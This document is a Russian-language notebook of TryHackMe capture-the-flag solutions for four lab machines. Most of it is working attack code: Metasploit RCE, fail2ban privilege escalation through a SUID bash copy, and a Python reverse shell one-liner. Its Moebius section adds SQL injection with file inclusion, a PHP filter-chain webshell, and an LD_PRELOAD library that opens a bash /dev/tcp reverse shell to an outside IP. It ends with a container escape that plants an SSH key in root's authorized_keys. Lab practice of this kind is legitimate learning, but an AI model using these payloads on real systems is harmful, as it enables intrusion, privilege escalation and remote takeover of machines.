# TryHackMe
~~Записки сумасшедшего~~ Решения задач с TryHackMe

## 1. Billing
Идея - использовать Metasploit для использования уязвимости cve_2023_30258 (запуск shell скрипта через параметры запроса)
```bash
# 1 флаг
nmap -sC -sV -oN MACHINE_IP

sudo apt update && sudo apt install metasploit-framework -y # Установка утилиты для использования уязвимостей

# Настройка и запуск эксплойта уязвимости
use exploit/linux/http/magnusbilling_unauth_rce_cve_2023_30258
set rhosts MACHINE_IP
set lhost HOST_IP
run

# Поиск и получение флага
cd /
search -f user.txt 
cat ./home/magnus/user.txt



# 2 флаг
# для него уже нужны привилегии root, которых у пользователя к которому мы полдключились нет
shell
sudo -l # Просмотр доступных действий пользователю

# У нас есть доступ к запуску fail2ban-client, но нет прав на на просмотр и редактирование ее файлов (/etc/fail2ban)
# Идея - создать копию конфигурационного файла и изменить его и запустить fail2ban-client передав ему имправленный конфигурационный файл

rsync -av /etc/fail2ban/ /tmp/fail2ban/ # Копируем все содержимое /etc/fail2ban

# Меняем конфиги по этой статье: https://juggernaut-sec.com/fail2ban-lpe/

cat > /tmp/script <<EOF
#!/bin/sh
cp /bin/bash /tmp/bash
chmod 755 /tmp/bash
chmod u+s /tmp/bash
EOF
chmod +x /tmp/script

cat > /tmp/fail2ban/action.d/custom-start-command.conf <<EOF
[Definition]
actionstart = /tmp/script
EOF

cat >> /tmp/fail2ban/jail.local <<EOF
[my-custom-jail]
enabled = true
action = custom-start-command
EOF

cat > /tmp/fail2ban/filter.d/my-custom-jail.conf <<EOF
[Definition]
EOF

# Перезапускаем fail2ban-client с новым файлом конфигурации
sudo fail2ban-client -c /tmp/fail2ban/ -v restart

# Получаем привилегии рута
cd tmp
./bash -p

# Получаем ответ
cd /root
cat root.txt
```

## 2. Tech_Supp0rt: 1
Идея - Заюзать CVE-2018-19422 (reverse shell) на серверер скамеров
```bash
nmap -sC -sV -oN MACHINE_IP

# Перебор скрытых директрий
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Получения списка доступных общих ресурсов на SMB-сервере (windows-совместимый файловый обмен)
smbclient -L MACHINE_IP

# Подключаемся к websvr и достаем оттуда какой-то подозрительный enter.txt
smbclient //10.10.59.1/websvr
ls -l
get enter.txt
exit

# Смотрим че там (а там адрес сайтика, логин и зашифрованный пароль!) 
cat enter.txt

# Дешифруем пароль из base64, получаем Scam2021
# Скамеры используют subrion 4.2.1 (видно в интерфейсе), но там есть уязвимости

# Эксплойтим уязвимость CVE-2018-19422 (reverse shell)
# https://github.com/hev0x/CVE-2018-19422-SubrionCMS-RCE
sudo python3 subrionRCE.py -u http://MACHINE_IP/subrion/panel/ -l admin -p Scam2021

ls /home
nc -lvnp 9001
cat /var/www/html/wordpress/wp-config.php

ssh scamsite@HOST_IP
sudo -l

# iconv можно использовать для чтения файлов
sudo iconv -f 8859_1 -t 8859_1 "/root/root.txt"
```

## 3. Battery
Идея - 
```bash
nmap -sC -sV -oN MACHINE_IP

# На порту 80 видим невероятно крутой сайт с надписью battery и все, ищем для него скрытые директории
gobuster dir -u http://MACHINE_IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .html,.php,.txt

# Получили различные .html и .php файлы, просто копаемся в них, там можно регаться, логиниться, смотреть дашборд с убогим дизайном
# Самым интересным кажется admin.php, но там просто так не залогиниться
# Спустя куча попыток что-то найти в каком то php файле уже не помню были найдены креды с паролем для подключения по ssh пользователя cyber! Там же лежал первй флаг

cat flag.txt

# найти что то еще кроме файла run.py, к которому у пользователя был доступ только на запуск, не получилось
# в такой ситуации файл часто подменяют на файл с таким же именем , но другим содержимым, то есть можно написать в него reverse shell

rm -rf run.py

cat run.py
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((HOST_IP,9001));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")

# запускаем и получаем права рута!
sudo usr/bin/python3 /home/cyber/run.py

whoami # root

# остается найти флаги
cd /home
cd yash
cat flag2.txt

cd /root/
cat root.txt
```

## 4. Moebius


```bash

nmap -sC -sV -oN MACHINE_IP

# На порту 80 видим сайтик с cat pictures!
# Там есть cute cats, smart cats и favorite cats

# Если посмотреть какую нибудь категорию, мы попадаем на album.php
# Смотрим album.php и видим какие то хэши в названиях картинок
# Я пробовала дешифровать, но ничего не получилось

# Давльше можно попробовать разные инъекции через sqlmap
sqlmap -u 'http://moebius.thm/album.php?short_tag=smart' -p short_tag --batch
sqlmap -u 'http://moebius.thm/album.php?short_tag=smart' --dump # Выводит всю бд web с таблицами albums и images

# Так как в параметры запроса передается путь к файлу, можно попробовать заюзать LFI уязвимость, но в путь так же передается и хэш, в бд он не хранится, а значит генерируется где-то в скрипте
# Далее спустя кучу sql инъекций удалось выяснить главное:
# Когда приложение получит id альбома через SELECT id FROM albums WHERE short_tag = '<короткий_тег>', оно выполнит другой запрос на получение из album по album_id

# Пробуем передать в запрос инъекцию:
SELECT id FROM albums WHERE short_tag='' UNION SELECT "-1 UNION SELECT '/etc/passwd' -- -" -- -

# Оказывается надо закодировать путь в шестнадцатиричный формат!
SELECT id FROM albums WHERE short_tag='' UNION SELECT "0 UNION SELECT 1,2,0x2f6574632f706173737764-- -"-- -

# Получаем адреc с путем в /etc/passwd
http://moebius.thm/image.php?hash=9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d&path=/etc/passwd

# Далее можно получить хэш .php файла с помощью  php://filter/convert.base64-encode/resource=
view-source:http://MACHINE_IP/image.php?hash=38420322a9fb901937cc3c0cea5ec07cb2124de36906634e008270b5f193dbee&path=php://filter/convert.base64-encode/resource=/var/www/html/album.php

# Эндпоинт возвращает хэш в base64, дешифруем м получаем php файл, со строками:
include('dbconfig.php');
$hash = hash_hmac('sha256', $path, $SECRET_KEY);

# То есть надо искать в dbconfig.php, проделываем аналогичную технику
SELECT id FROM albums WHERE short_tag='' UNION SELECT "0 UNION SELECT 1,2,0x7068703a2f2f66696c7465722f636f6e766572742e6261736536342d656e636f64652f7265736f757263653d6462636f6e6669672e706870-- -"-- -

# Видим там креды БД и secret_key!

# Получается теперь мы можем хэшировать любые пути и отпралять запросы с ними
```
Напишем простой python скрипт hash_generator.py для шифрования:

```python
import sys
import hmac
import hashlib

SECRET_KEY = 'an8h6oTlNB9N0HNcJMPYJWypPR2786IQ4I3woPA1BqoJ7hzIS0qQWi2EKmJvAgOW'

def get_hash(path):
    key_bytes = SECRET_KEY.encode('utf-8')
    path_bytes = path.encode('utf-8')
    return hmac.new(key_bytes, path_bytes, hashlib.sha256).hexdigest()

path = "/etc/passwd"
print(get_hash(path))
```
Проверим его:
```bash
python3 hash_generator.py
```
```bash
9fa6eacac1714e10527da6f9cf8570e46a5747d9ace37f4f9e963f990429310d 
```
Хэши совпали!

```bash
# Теперь попробуем залезть в image.php просто заменив путь на php://filter/convert.base64-encode/resource=image.php, получим хэш и дешифриуем
# Снова получаем содержимое php файла

# Потенциальных уязвимостей для RCE в йале нет ,поэтому сработает только "leveraging PHP filter chains".
# Идея - по-умному применяя фильтры, мы можем создать поток, который действует как виртуальный файл, содержащий произвольное содержимое, включая PHP—код
# https://github.com/synacktiv/php_filter_chain_generator

python3 php_filter_chain_generator.py --chain '<?php @eval($_REQUEST["0"]); ?>'

# Все работает, но на сервере отключены почти все системные функции!
# Существует способ обхода с помощью putenv для установки переменной окружения LD_PRELOAD и mail для установки бибилиотеки.
```
С++ код:

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void startup_hook() {
    if (unsetenv("LD_PRELOAD") != 0) {
        perror("unsetenv failed");
    }

    const char *cmd = "bash -c 'bash -i >& /dev/tcp/10.9.3.99/443 0>&1'";
    int ret = system(cmd);

    if (ret == -1) {
        perror("system call failed");
    }
}

void _init() {
    startup_hook();
}
```

Запускаем:

```bash
gcc -o shell.so shell.c -fPIC -shared -nostartfiles

# Запускаем HTTP сервер и скачиваем туда бинари:
python3 -m http.server 1234 
ch = curl_init('http://10.9.3.99:1234/shell.so');curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);file_put_contents('/tmp/shell.so', curl_exec($ch)); curl_close($ch);
nc -lnvp 443

putenv('LD_PRELOAD=/tmp/shell.so'); mail('a','a','a','a');

# Создаем оболочку /bin/bash
script -q -c "$(echo /bin/bash)" /dev/null
export TERM=xterm

# После преерытия папок всего сервера так и не удается найти ни один флаг!
# Оказывается это потому что мы в докер контейнере!)
# Один из методов сбежать из контейнера - добавить публичный SSH ключ в /root/.ssh/authorized_keys так как здешний контейнер может монттироваться к хосту (а еще у нас там есть права рута!)
sudo su
mount /dev/USERAME /mnt 

# Генерируем ключ и перенаправляем
ssh-keygen -f USERNAME -t ed25519
cat USERNAME.pub
echo 'public_key' >> /mnt/root/.ssh/authorized_keys

ssh -i USERNAME root@MACHINE_IP
```

С меня хватит!)
